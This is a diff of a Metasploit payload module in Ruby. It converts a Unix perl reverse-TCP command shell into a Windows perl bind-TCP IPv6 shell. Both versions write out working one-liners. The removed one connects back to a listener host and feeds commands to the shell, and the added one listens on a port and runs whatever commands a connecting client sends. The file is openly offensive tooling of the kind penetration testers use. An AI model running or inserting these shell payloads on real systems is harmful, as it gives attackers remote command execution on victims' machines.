@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -21,17 +21,16 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP (via perl)',
+			'Name'          => 'Windows Command Shell, Bind TCP (via perl) IPv6',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell via perl',
-			'Author'        => 'cazz',
+			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
+			'Author'        => ['Samy <samy@samy.pl>', 'cazz', 'patrick'],
 			'License'       => BSD_LICENSE,
-			'Platform'      => 'unix',
+			'Platform'      => 'win',
 			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcp,
+			'Handler'       => Msf::Handler::BindTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'perl',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -51,10 +50,10 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		lhost = datastore['LHOST']
-		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+
+		cmd = "perl -MIO -e \"while($c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
+
+		return cmd
 	end
 
 end
